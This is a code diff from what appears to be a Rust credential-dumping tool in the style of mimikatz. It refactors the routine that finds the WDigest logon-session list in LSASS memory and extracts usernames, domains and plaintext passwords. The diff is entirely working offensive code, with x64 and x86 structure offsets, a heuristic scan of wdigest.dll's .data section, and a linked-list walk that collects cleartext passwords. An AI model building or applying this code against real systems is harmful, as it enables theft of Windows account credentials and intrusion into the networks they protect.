@@ -1,14 +1,13 @@
 use crate::error::Result;
 use crate::lsass::crypto::CryptoKeys;
 use crate::lsass::patterns;
-use crate::lsass::types::{Arch, WdigestCredential, read_ptr, read_ustring, is_valid_user_ptr};
+use crate::lsass::types::{Arch, WdigestCredential, read_ptr, read_ustring, is_valid_user_ptr, walk_list, scan_data_for_list_head};
 use crate::memory::VirtualMemory;
 use crate::pe::parser::PeHeaders;
 
 /// Per-arch offsets for KIWI_WDIGEST_LIST_ENTRY.
 /// Same struct layout for all Vista+ builds; only pointer sizes differ between x64/x86.
 struct WdigestOffsets {
-    flink: u64,
     luid: u64,
     username: u64,
     domain: u64,
@@ -20,7 +19,7 @@ struct WdigestOffsets {
 ///   +0x20: LUID (8B), +0x28: pad (8B)
 ///   +0x30: UserName (16B), +0x40: HostName (16B), +0x50: Password (16B)
 const WDIGEST_OFFSETS_X64: WdigestOffsets = WdigestOffsets {
-    flink: 0x00, luid: 0x20, username: 0x30, domain: 0x40, password: 0x50,
+    luid: 0x20, username: 0x30, domain: 0x40, password: 0x50,
 };
 
 /// x86 offsets:
@@ -28,7 +27,7 @@ const WDIGEST_OFFSETS_X64: WdigestOffsets = WdigestOffsets {
 ///   +0x10: LUID (8B), +0x18: pad (4B)
 ///   +0x1C: UserName (8B), +0x24: HostName (8B), +0x2C: Password (8B)
 const WDIGEST_OFFSETS_X86: WdigestOffsets = WdigestOffsets {
-    flink: 0x00, luid: 0x10, username: 0x1C, domain: 0x24, password: 0x2C,
+    luid: 0x10, username: 0x1C, domain: 0x24, password: 0x2C,
 };
 
 /// Extract WDigest credentials (plaintext passwords) from wdigest.dll (unified x64/x86).
@@ -83,20 +82,7 @@ pub fn extract_wdigest_credentials_arch(
     log::info!("WDigest l_LogSessList at 0x{:x} (arch={:?})", list_addr, arch);
 
     // Walk the list
-    let head_flink = read_ptr(vmem, list_addr, arch)?;
-    if head_flink == 0 || head_flink == list_addr {
-        return Ok(results);
-    }
-
-    let mut current = head_flink;
-    let mut visited = std::collections::HashSet::new();
-
-    loop {
-        if current == list_addr || visited.contains(&current) || current == 0 {
-            break;
-        }
-        visited.insert(current);
-
+    walk_list(vmem, list_addr, arch, |current| {
         let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
         let username = read_ustring(vmem, current + offsets.username, arch).unwrap_or_default();
         let domain = read_ustring(vmem, current + offsets.domain, arch).unwrap_or_default();
@@ -112,12 +98,8 @@ pub fn extract_wdigest_credentials_arch(
             );
             results.push((luid, WdigestCredential { username, domain, password }));
         }
-
-        current = match read_ptr(vmem, current + offsets.flink, arch) {
-            Ok(f) => f,
-            Err(_) => break,
-        };
-    }
+        true
+    })?;
 
     let with_passwords = results.iter().filter(|(_, c)| !c.password.is_empty()).count();
     log::info!("WDigest: found {} entries ({} with passwords)", results.len(), with_passwords);
@@ -165,62 +147,30 @@ fn find_wdigest_list_in_data(
     offsets: &WdigestOffsets,
     arch: Arch,
 ) -> Result<u64> {
-    let data_sec = pe.find_section(".data").ok_or_else(|| {
-        crate::error::VmkatzError::PatternNotFound(".data section in wdigest.dll".to_string())
-    })?;
-
-    let data_base = wdigest_base + data_sec.virtual_address as u64;
-    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
-    let data = vmem.read_virt_bytes(data_base, data_size)?;
-    let step = arch.ptr_size() as usize;
-
-    for off in (0..data_size.saturating_sub(step * 2)).step_by(step) {
-        let flink = read_ptr_from_buf(&data, off, arch);
-        let blink = read_ptr_from_buf(&data, off + step, arch);
-
-        if !is_valid_user_ptr(flink, arch) || !is_valid_user_ptr(blink, arch) {
-            continue;
-        }
-        if flink >= wdigest_base && flink < wdigest_base + 0x100000 {
-            continue;
-        }
-
-        let list_addr = data_base + off as u64;
-
-        let entry_flink = match read_ptr(vmem, flink, arch) {
-            Ok(f) => f,
-            Err(_) => continue,
-        };
-        if entry_flink != list_addr && !is_valid_user_ptr(entry_flink, arch) {
-            continue;
-        }
-
-        let luid = vmem.read_virt_u64(flink + offsets.luid).unwrap_or(0);
-        if luid == 0 || luid > 0xFFFFFFFF {
-            continue;
-        }
-
-        let username = read_ustring(vmem, flink + offsets.username, arch).unwrap_or_default();
-        if username.is_empty() || username.len() > 256 {
-            continue;
-        }
-
-        log::debug!(
-            "Found l_LogSessList candidate at 0x{:x}: flink=0x{:x} LUID=0x{:x} user='{}'",
-            list_addr, flink, luid, username
-        );
-        return Ok(list_addr);
-    }
-
-    Err(crate::error::VmkatzError::PatternNotFound(
-        "l_LogSessList in wdigest.dll .data section".to_string(),
-    ))
-}
-
-/// Read a pointer-sized value from a byte buffer.
-fn read_ptr_from_buf(data: &[u8], off: usize, arch: Arch) -> u64 {
-    match arch {
-        Arch::X86 => super::types::read_u32_le(data, off).unwrap_or(0) as u64,
-        Arch::X64 => super::types::read_u64_le(data, off).unwrap_or(0),
-    }
+    scan_data_for_list_head(
+        vmem, pe, wdigest_base, arch, 0x10000, "wdigest.dll", 0x100000,
+        false, "l_LogSessList",
+        |flink, list_addr| {
+            let entry_flink = match read_ptr(vmem, flink, arch) {
+                Ok(f) => f,
+                Err(_) => return false,
+            };
+            if entry_flink != list_addr && !is_valid_user_ptr(entry_flink, arch) {
+                return false;
+            }
+            let luid = vmem.read_virt_u64(flink + offsets.luid).unwrap_or(0);
+            if luid == 0 || luid > 0xFFFFFFFF {
+                return false;
+            }
+            let username = read_ustring(vmem, flink + offsets.username, arch).unwrap_or_default();
+            if username.is_empty() || username.len() > 256 {
+                return false;
+            }
+            log::debug!(
+                "Found l_LogSessList candidate at 0x{:x}: flink=0x{:x} LUID=0x{:x} user='{}'",
+                list_addr, flink, luid, username
+            );
+            true
+        },
+    )
 }
